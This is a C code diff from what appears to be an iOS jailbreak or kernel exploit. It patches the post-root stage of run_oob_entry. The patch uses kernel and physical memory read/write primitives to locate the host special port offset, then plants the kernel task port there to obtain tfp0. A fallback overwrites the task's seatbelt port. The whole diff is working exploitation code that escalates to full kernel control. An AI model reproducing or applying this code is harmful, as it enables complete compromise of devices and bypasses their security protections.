@@ -257,9 +257,24 @@ int run_oob_entry(bool enable_tfp0) {
 
         if (getuid() == 0) {
             uint32_t host_priv_addr = find_host_port();
-            uint32_t realhost = kread32(host_priv_addr + koffsetof(ipc_port, ip_kobject));
-            uint32_t hsp4_offset = 0x8 + (4 * sizeof(void *));
+            if (host_priv_addr == 0) goto fallback;
+            print_log("[*] host_priv_addr: 0x%x\n", host_priv_addr);
 
+            uint32_t realhost = kread32(host_priv_addr + koffsetof(ipc_port, ip_kobject));
+            if (realhost == 0) goto fallback;
+            print_log("[*] realhost: 0x%x\n", realhost);
+
+            uint32_t realhost_pa = kvtophys(realhost);
+            if (realhost_pa == 0) goto fallback;
+       
+            uint32_t hsp4_offset = 0;
+            for (uint32_t i = 0; i < 0x40; i+=0x4) {
+                if (physread32(realhost_pa + i) == host_priv_addr) {
+                    hsp4_offset = i + 0x8;
+                }
+            }
+
+            if (hsp4_offset == 0) goto fallback;
             kwrite32(realhost + hsp4_offset, kinfo->kern_port_addr);
             usleep(100000);
             sync();
@@ -274,6 +289,7 @@ int run_oob_entry(bool enable_tfp0) {
             kwrite32(realhost + hsp4_offset, 0);
         }
 
+fallback:
         if (!MACH_PORT_VALID(kinfo->tfp0)) {
             uint32_t seatbelt_addr = kread32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt));
             kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), kinfo->kern_port_addr);
